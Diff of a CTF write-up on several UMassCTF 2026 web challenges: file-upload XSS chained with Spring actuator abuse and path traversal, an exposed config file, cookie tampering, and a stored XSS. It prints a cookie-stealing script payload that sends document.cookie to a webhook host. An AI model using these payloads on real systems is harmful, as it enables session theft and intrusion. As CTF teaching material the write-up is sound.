@@ -4,25 +4,25 @@ classes: wide
 header:
   teaser: /assets/images/ctf_writeups/UMass_CTF/UMassCTF_Logo.jpg
 ribbon: blue
-description: "Hello everyone, today's writeup will be for UMassCTF 2026 some web challenges."
+description: "Hello everyone, today's writeup will be for UMassCTF 2026, covering some web challenges."
 categories:
   - CTF Writeups
 toc: true
 ---
 
-Hello everyone, today's writeup will be for UMassCTF 2026 some web challenges, so let's start.
+Hello everyone, today's writeup is for UMassCTF 2026, covering some web challenges, so let's get started.
 
 ## The Block City Times
 
 ![The_Block_City_Times](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/The_Block_City_Times.png)
 
-Let's firing up the instance and see the challenge.
+Let's fire up the instance and see the challenge.
 
-We can see it is a blog website with some articles and stories in different categories.
+We can see that it is a blog website with some articles and stories in different categories.
 
 ![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Site_Overview.png)
 
-It also contains admin login page:
+It also contains an admin login page:
 
 ![Admin_Login](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Admin_Login.png)
 
@@ -30,7 +30,7 @@ And a form to submit your story:
 
 ![Submit_Story](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Submit_Story.png)
 
-As the challenge is white-box, let's its analyzing files to get the full idea and attack flow.
+As the challenge is white-box, let's analyze its files to get the full idea and attack flow.
 
 **`docker-compose.yml` Analysis:**
 
@@ -88,15 +88,15 @@ networks:
 
 ```
 
-- The app contains three services `app`, `editorial` and `report-runner` .
+- The app contains three services: `app`, `editorial`, and `report-runner`.
 
 - `app` is on **both** networks:
 
-  - it's the bridge between internet and internal.
+  - It's the bridge between the internet and the internal network.
 
-  - Built from current directory (`.`)
+  - Built from the current directory (`.`)
 
-  - Uses ports 8080
+  - Uses port 8080
 
 
   - This is the ONLY service you can access from your browser
@@ -104,11 +104,8 @@ networks:
 
   - Environment variables:
 
-
-  - ADMIN_USERNAME → default: admin
-
-
-  - ADMIN_PASSWORD → default: changed_on_remote
+    - ADMIN_USERNAME → default: admin
+    - ADMIN_PASSWORD → default: changed_on_remote
 
 
   - Communicates with editorial via `http://editorial:9000/submissions`
@@ -122,14 +119,14 @@ networks:
   - Cannot be accessed externally
   - No ports → cannot be accessed from browser
   - Runs on PORT=9000
-  - Call back the app using `http://app.internal:8080`
+  - It calls back the app using `http://app.internal:8080`
   - Connected networks: `editorial-net`
 
 - `report-runner` is on **both** networks.
 
   - Built from `./developer`
 
-  - Acts like an Admin bot
+  - Acts like an admin bot
 
   - Environment variables:
 
@@ -151,13 +148,11 @@ networks:
 
   - `editorial-net` for internal communication
 
-  - The critical one is `editorial-net` which is marked internal:
-    true. This means no traffic can enter or leave it from the internet — only containers on that
-    network can talk to each other.
+  - The critical one is `editorial-net`, which is marked `internal: true`. This means no traffic can enter or leave it from the internet — only containers on that network can talk to each other.
 
-So from analysis, we knew `report-runner` logs into the app as admin and the flag is an `env` variable injected into `report-runner`.
+From the analysis, we know that `report-runner` logs into the app as admin, and the flag is an `env` variable injected into `report-runner`.
 
-If we deep dive in the code, we can see it is build on java and there is an `application.yml` file, so let's analyze.
+If we deep dive into the code, we can see it is built on Java, and there is an `application.yml` file, so let's analyze it.
 
 **`application.yml` Analysis:**
 
@@ -226,17 +221,17 @@ app:
   - `/actuator/env` → environment variables
   - `/actuator/refresh` → reload config 
   - `health` endpoint:
-    - `show-details: always` Shows full system details (DB, disk, etc.)
+    - `show-details: always` shows full system details (DB, disk, etc.)
   - `env` endpoint:
-    - `enabled: true` Allows modifying environment variables via HTTP POST
+    - `enabled: true` allows modifying environment variables via HTTP POST
 
 - `app:` 
 
   - Uses admin credentials same as `docker-compose.yml`
-  - Uploaded files will be stored in `uploads` directory
-  - `active-config: prod` App is running in production mode
+  - Uploaded files will be stored in the `uploads` directory
+  - `active-config: prod` → App is running in production mode
 
-  - `enforce-production: true` Forces production rules
+  - `enforce-production: true` forces production rules
   - `app.outbound` handles internal requests:
     - App sends requests to internal service on port `9000`
     - Uses `report-url` as `http://report-runner:9001/report`
@@ -306,10 +301,10 @@ const FLAG            = process.env.FLAG            || 'UMASS{TEST_FLAG}';
 
 ```
 
-- It login with admin credentials.
-- It sets the flag into the admin cookie with variable called `FLAG`.
-- It visits target endpoint.
-- It extracts the page content and execute its Javascript.
+- It logs in with admin credentials.
+- It sets the flag into the admin cookie with a variable called `FLAG`.
+- It visits the target endpoint.
+- It extracts the page content and executes its JavaScript.
 
 **`trigger-server.js` Analysis:**
 
@@ -344,14 +339,13 @@ app.listen(PORT, () => console.log(`Report trigger server on :${PORT}`));
 ```
 
 - The server listens on port 9001.
-- The app calls it at http://report-runner:9001/report. You cannot reach it directly, only the app can. So you need the app's
-  `/admin/report` endpoint to call it on your behalf.
+- The app calls it at `http://report-runner:9001/report`. You cannot reach it directly; only the app can. So you need the app's `/admin/report` endpoint to call it on your behalf.
 
-- It takes `endpoint` from request body and the default path is `/api/config`.
-- It runs `report-api.js` (we explained above) and passes the environment variables.
-- It passes `REPORT_ENDPOINT ` as your endpoint (user-input).
+- It takes `endpoint` from the request body, and the default path is `/api/config`.
+- It runs `report-api.js` (explained above) and passes the environment variables.
+- It passes `REPORT_ENDPOINT` as your endpoint (user input).
 
-Let's move to Editorial Bot analysis.
+Let's move to the Editorial Bot analysis.
 
  **`server.js` Analysis:**
 
@@ -428,18 +422,18 @@ app.listen(PORT, () => {
 
 ```
 
-- Login with admin credentials.
+- It logs in with admin credentials.
 - `/submissions` route:
   - The filename field comes from the app's story submission.
   - The app sets it when it saves the uploaded file.
   - The bot then visits `/files/<filename>`.
-  - If the file is HTML with JavaScript → that JS runs in the bot's browser. That JS has access to the admin session AND can make authenticated requests to the app.
+  - If the file is HTML with JavaScript, that JS runs in the bot's browser. That JS has access to the admin session AND can make authenticated requests to the app.
 
-Now let's see the controllers in `sr/java` folder to examine how website works and its routes.
+Now let's look at the controllers in the `src/java` folder to examine how the website works and its routes.
 
 **`StoryController.java` Analysis:**
 
-``` java
+```java
 @PostMapping("/submit")
 public String submitStory(@RequestParam String title,
                           @RequestParam String author,
@@ -514,20 +508,20 @@ public ResponseEntity<Resource> serveFile(@PathVariable String filename) throws 
 ```
 
 - `/submit` route:
-  - It takes four parameters: `title`, `author`, `description`, `file`.
-  - It checks if file is empty or not.
-  - It checks for file content type and whether it in allowed types or not.
+  - It takes four parameters: `title`, `author`, `description`, and `file`.
+  - It checks if the file is empty or not.
+  - It checks the file content type and whether it is in the allowed types.
   - It removes dangerous characters.
-  - It generates a unique file name and stores it.
-  - It sends to `Editorial` service `/submissions`.
-  - Editorial service receives filename and admin bot opens: `/files/{filename}`
+  - It generates a unique filename and stores it.
+  - It sends the data to the `Editorial` service at `/submissions`.
+  - Editorial service receives the filename, and the admin bot opens: `/files/{filename}`.
 - `/files/{filename}` route:
-  - It adds filename to `/uploads`
-  - It checks whether the filePath starts with `/uploads`.
-  - It loads file and detects content type.
-  - Browser receives file
+  - It adds the filename to `/uploads`.
+  - It checks whether the file path starts with `/uploads`.
+  - It loads the file and detects the content type.
+  - The browser receives the file.
 
-**`ReportController.java`Analysis:**
+**`ReportController.java` Analysis:**
 
 ```java
 @Controller
@@ -595,11 +589,11 @@ public class ReportController {
 ```
 
 - `/admin/report` route:
-  - It works only works in `dev` environment mode.
-  - It checks if endpoint start with `/api`.
-  - It calls `report-runner` (`/report`) and sends  JSON request with endpoint.
+  - It only works in `dev` environment mode.
+  - It checks if the endpoint starts with `/api`.
+  - It calls `report-runner` (`/report`) and sends a JSON request with the endpoint.
 
-**`TagController.java `Analysis:**
+**`TagController.java` Analysis:**
 
 ```java
 @RestController
@@ -650,21 +644,21 @@ public class TagController {
 
   - It gets all tags.
 
-  - It gets tags for specific article.
+  - It gets tags for a specific article.
 
   - It returns articles that have a specific tag.
 
     ![Tags_2](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Tags_2.png)
 
     ![Tags_1](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Tags_1.png)
-
-  - It updates article tags and returns it sanitized. 
+    
+  - It updates article tags and returns them sanitized. 
 
 ### Attack Flow
 
 ![Attack_Flow](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Attack_Flow.png)
 
-From our code analysis we know the app accepts file uploads at POST /submit. The upload filter in StoryController.java only allows `text/plain` and `application/pdf`. But when the server serves files back, it uses `Files.probeContentType()` which reads the file extension.
+From our code analysis, we know the app accepts file uploads at `POST /submit`. The upload filter in `StoryController.java` only allows `text/plain` and `application/pdf`. But when the server serves files back, it uses `Files.probeContentType()`, which reads the file extension.
 
 > The `Files.probeContentType()` method is used to identify the MIME type of a file.
 
@@ -674,43 +668,43 @@ We need one file that serves two purposes: setup (when the editorial bot runs it
 
 **Branch B:** fires when FLAG cookie IS present → we are the report-runner bot → read `document.cookie` and send the flag out.
 
-So, when we upload a file, we need to keep `Content-Type` as `text/plain` as this is what passes the server's filter and on the server, filter sees `text/plain` which is allowed. File saved as `<uuid>-payload.html`.
+So, when we upload a file, we need to keep `Content-Type` as `text/plain`, as this is what passes the server's filter. On the server, the filter sees `text/plain`, which is allowed. The file is saved as `<uuid>-payload.html`.
 
-When served later, `Files.probeContentType()` reads `.html` that returns `text/html`. The bot's browser renders it as HTML and executes our JavaScript.
+When served later, `Files.probeContentType()` reads `.html` and returns `text/html`. The bot's browser renders it as HTML and executes our JavaScript.
 
 ![Payload_Upload](/assets/images/ctf_writeups/UMass_CTF/The_Block_City_Times/Payload_Upload.png)
 
-After receiving the submission, the app sends `POST` request with the filename to `editorial:9000/submissions`. The editorial bot launches a real Chromium browser, logs in as admin, then visits `/files/<uuid>-payload.html`. Our JavaScript executes inside that browser with a full admin session.
+After receiving the submission, the app sends a `POST` request with the filename to `editorial:9000/submissions`. The editorial bot launches a real Chromium browser, logs in as admin, then visits `/files/<uuid>-payload.html`. Our JavaScript executes inside that browser with a full admin session.
 
 The flow:
 
 - App calls `http://editorial:9000/submissions`.
 - Editorial `server.js` picks up the filename and builds the file URL.
-- Bot navigates to /login, types admin credentials and gets the cookie then visits our file `payload.html` as `text/html` and executes the JavaScript
-- Our JS now runs in a real browser with a valid admin session cookie
-- Every fetch() call our JS makes will carry that admin JSESSIONID automatically.
+- The bot navigates to /login, types admin credentials, gets the cookie, then visits our file `payload.html` as `text/html` and executes the JavaScript.
+- Our JS now runs in a real browser with a valid admin session cookie.
+- Every `fetch()` call our JS makes will carry that admin JSESSIONID automatically.
 
 We can now call any admin-only endpoint such as `/admin/report`.
 
-Our JavaScript is now running inside the editorial bot's browser with admin privileges. The `/admin/report` endpoint which triggers the `report-runner` bot (blocked in production mode (`prod`)). So, we need to unlock it.
+Our JavaScript is now running inside the editorial bot's browser with admin privileges. The `/admin/report` endpoint, which triggers the `report-runner` bot, is blocked in production mode (`prod`). So, we need to unlock it.
 
-From our config analysis we know the actuator's env POST endpoint has no authentication and can write any config property at runtime.
+From our config analysis, we know the actuator's env POST endpoint has no authentication and can write any config property at runtime.
 
-The `/admin/report` endpoint checks if `active-config` equals `dev` before doing anything. In production it just redirects us away. The normal UI switch (`/admin/switch`) is blocked by `enforce-production:true`. But the actuator bypasses the UI entirely and writes directly into the running app's config memory.
+The `/admin/report` endpoint checks if `active-config` equals `dev` before doing anything. In production, it just redirects us away. The normal UI switch (`/admin/switch`) is blocked by `enforce-production: true`. But the actuator bypasses the UI entirely and writes directly into the running app's config memory.
 
-So, we need to send `POST /actuator/env` with body `{ "name": "app.active-config", "value": "dev" }` to change the environment. Then we should reload Spring Boot config using `/actuator/refresh `.
+So, we need to send `POST /actuator/env` with body `{ "name": "app.active-config", "value": "dev" }` to change the environment. Then we should reload the Spring Boot config using `/actuator/refresh`.
 
-Spring Security requires a valid CSRF token on every POST request. Without it the server returns `403` Forbidden. Since our JS is running in the editorial bot's browser which has an admin session, we can fetch `/admin` and read the token directly from the HTML.
+Spring Security requires a valid CSRF token on every POST request. Without it, the server returns `403` Forbidden. Since our JS is running in the editorial bot's browser, which has an admin session, we can fetch `/admin` and read the token directly from the HTML.
 
-The `/admin/report` endpoint has two conditions: must be in `dev` mode (bypassed) and endpoint must start with `/api/`.
+The `/admin/report` endpoint has two conditions: it must be in `dev` mode (which we bypassed), and the endpoint must start with `/api/`.
 
-We can bypass `/api` using path traversal (`../`) as it does not resolve the path first. We use `/api/../files/payload.html` which passes the string check but resolves to /files/payload.html when the HTTP server processes it.
+We can bypass the `/api` check using path traversal (`../`), as it does not resolve the path first. We use `/api/../files/payload.html`, which passes the string check but resolves to `/files/payload.html` when the HTTP server processes it.
 
-Now the app called `http://report-runner:9001/report` with our path-traversal endpoint. The report-runner service now spawns `report-api.js` which logs into the app, sets the FLAG as a browser cookie, and visits the endpoint we specified.
+Now the app calls `http://report-runner:9001/report` with our path-traversal endpoint. The report-runner service now spawns `report-api.js`, which logs into the app, sets the FLAG as a browser cookie, and visits the endpoint we specified.
 
-`report-api.js` follows the same login flow as the editorial bot. But before visiting any URL it sets the `FLAG` environment variable as a browser cookie. Then it visits our endpoint. Because our path traversal resolved to `/files/payload.html`, it visits our XSS file but this time with the `FLAG` cookie present.
+`report-api.js` follows the same login flow as the editorial bot. But before visiting any URL, it sets the `FLAG` environment variable as a browser cookie. Then it visits our endpoint. Because our path traversal resolved to `/files/payload.html`, it visits our XSS file, but this time with the `FLAG` cookie present.
 
-The hard work was done. Now, we just read `document.cookie`, extract the FLAG value, and send it to our server (webhook).
+The hard work is done. Now, we just read `document.cookie`, extract the FLAG value, and send it to our server (webhook).
 
 **`payload.html`**
 
@@ -769,17 +763,18 @@ The hard work was done. Now, we just read `document.cookie`, extract the FLAG va
 
 > **Flag:** UMASS{A_mAn_h3s_f@l13N_1N_tH3_r1v3r}
 
+
 ## Brick by Brick
 
 ![Brick_by_Brick_](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Brick_by_Brick.png)
 
-The first challenge is black-box style, so let's navigate to the link provided directly.
+The first challenge is a black-box style, so let's navigate to the link provided directly.
 
-We can see it's a normal page with no functionalities, so I think to check whether the `robots.txt` exists. 
+We can see it's a normal page with no functionalities, so I decided to check whether `robots.txt` exists. 
 
 ![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Site_Overview.png)
 
-We can see `robots.txt` looks interesting.
+We can see that `robots.txt` looks interesting.
 
 ![robots.txt](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/robots.txt.png)
 
@@ -789,18 +784,18 @@ We can see `robots.txt` looks interesting.
 
 ![q3-report](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/q3-report.png)
 
-`it-onboarding.txt` caught my attention as it tells us some things:
+`it-onboarding.txt` caught my attention as it reveals some information:
 
-1. `?file=` parameter which indicates to local file inclusion (LFI)
-2. `config.php` which may contains sensitive data.
+1. The `?file=` parameter indicates local file inclusion (LFI).
+2. `config.php` may contain sensitive data.
 
 ![it-onboarding](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/it-onboarding.png)
 
-We can see `config.php` file is publicly exposed and contains admin dashboard endpoint with database credentials.
+We can see that the `config.php` file is publicly exposed and contains the admin dashboard endpoint with database credentials.
 
 ![config](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/config.png)
 
-So, let's go to `/dashboard-admin.php` and login with `administrator:administrator`
+So, let's navigate to `/dashboard-admin.php` and log in with `administrator:administrator`.
 
 ![Admin_Login](/assets/images/ctf_writeups/UMass_CTF/Brick_by_Brick/Admin_Login.png)
 
@@ -814,37 +809,37 @@ And we got the flag.
 
 ![BrOWSER_BOSS_FIGHT](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/BrOWSER_BOSS_FIGHT.png)
 
-If we go to the challenge website, we can see an input to enter a key and a door we can click.
+When we visit the challenge website, we can see an input field to enter a key and a door we can click.
 
 ![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Site_Overview.png)
 
-When we look at the source code, we observe that whatever the key we type, it will be replaced with `WEAK_NON_KOOPA_KNOCK`. 
+When we look at the source code, we observe that whatever key we type, it will be replaced with `WEAK_NON_KOOPA_KNOCK`. 
 
 ![SourceCode](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/SourceCode.png)
 
-So, typing random key and click on the door will redirect us to this page.
+So, typing a random key and clicking on the door will redirect us to this page.
 
 ![Site_Overview_2](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Site_Overview_2.png)
 
-If we look at burp suite, we can see interesting `Server` header in response with hint of `under_the_doormate`.
+If we look at Burp Suite, we can see an interesting `Server` header in the response with a hint of `under_the_doormate`.
 
 ![password](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/password_1.png)
 
 
 
-Let's try it as key.
+Let's try it as the key.
 
 ![password_2](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/password_2.png)
 
 
 
-We can see that we will redirected to another page but no flag appeared.
+We can see that we are redirected to another page, but no flag appeared.
 
-We can observe that there is a cookie variable called `hasAxe` and its default value is `false`.
+We can observe that there is a cookie variable called `hasAxe`, and its default value is `false`.
 
 ![Site_3](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Site_3.png)
 
-If we add `hasAxe: true` while visiting this endpoint, we will get the flag.
+If we add `hasAxe: true` when visiting this endpoint, we will get the flag.
 
 ![Flag](/assets/images/ctf_writeups/UMass_CTF/BrOWSER_BOSS_FIGHT/Flag.png)
 
@@ -854,19 +849,19 @@ If we add `hasAxe: true` while visiting this endpoint, we will get the flag.
 
 ![ORDER66](/assets/images/ctf_writeups/UMass_CTF/ORDER66/ORDER66.png)
 
-`White-Box` Challenge, so let's check the website first to understand what it does dynamically then move to source code.
+This is a white-box challenge, so let's check the website first to understand what it does dynamically, then move to the source code.
 
 ![Site_Overview](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Site_Overview.png)
 
 ![checker](/assets/images/ctf_writeups/UMass_CTF/ORDER66/checker.png)
 
-The app contains 66 box and one of them is vulnerable:
+The app contains 66 boxes, and one of them is vulnerable:
 
 ![Vulnerable_Code](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Vulnerable_Code.png)
 
-> `|safe` don't escape characters, so there is a chance for XSS and steal cookies.
+> `|safe` doesn't escape characters, so there is a chance for XSS and stealing cookies.
 
-But we need to find the vulnerable box. How??
+But we need to find the vulnerable box. How?
 
 `app.py`
 
@@ -884,20 +879,20 @@ def hello_world():
         session['seed'] = random.randint(1000, 9999)
 
     uid = session['user_id']
-    
+
     current_seed = session.get('seed', random.randint(1000, 9999))
     _, current_vuln_index = get_grid_context(uid, current_seed)
 
     current_content = db.get(f"{uid}:box_{current_vuln_index}") or ""
-    
+
     is_payload_present = "<script" in current_content.lower() or "alert(" in current_content.lower()
 
     if request.method == 'POST':
         submitted = [int(k.split('_')[1]) for k in request.form if k.startswith('box_') and request.form[k].strip()]
-        
+
         if len(submitted) > 1:
             return "ERROR: Only ONE box allowed.", 400
-        
+
         for i in range(1, 67):
             content = request.form.get(f'box_{i}')
             if content and i in submitted:
@@ -914,19 +909,19 @@ def hello_world():
 
     seed = session['seed']
     grid_data, vuln_index = get_grid_context(uid, seed)
-    
+
     return render_template('index.html', vuln_index=vuln_index, grid_data=grid_data, user_id=uid, seed=seed, host=host)
 ```
 
-Python's `random` is deterministic. sme seed equals same output, every time. The seed is exposed in the page. So we can extract the vulnerable box locally:
+Python's `random` is deterministic. The same seed equals the same output every time, and the seed is exposed in the page. So we can determine the vulnerable box locally:
 
 ![Vulnerable_Box_Num](/assets/images/ctf_writeups/UMass_CTF/ORDER66/Vulnerable_Box_Num.png)
 
-If our payload is in the wrong box, the vulnerable box moves on every submission. If it's in the right box, the seed and therefore the vulnerable box stays fixed permanently. So, we can send the seed URL to admin and get the flag.
+If our payload is in the wrong box, the vulnerable box moves with every submission. If it's in the right box, the seed and, therefore, the vulnerable box stay fixed permanently. So, we can send the seed URL to the admin and get the flag.
 
 **Payload:** `<script>fetch('https://webhook.site/YOUR-ID?c='+document.cookie)</script>`
 
-Now, let's send the seed URL to admin and get the flag.
+Now, let's send the seed URL to the admin and get the flag.
 
 ![admin_report](/assets/images/ctf_writeups/UMass_CTF/ORDER66/admin_report.png)
 
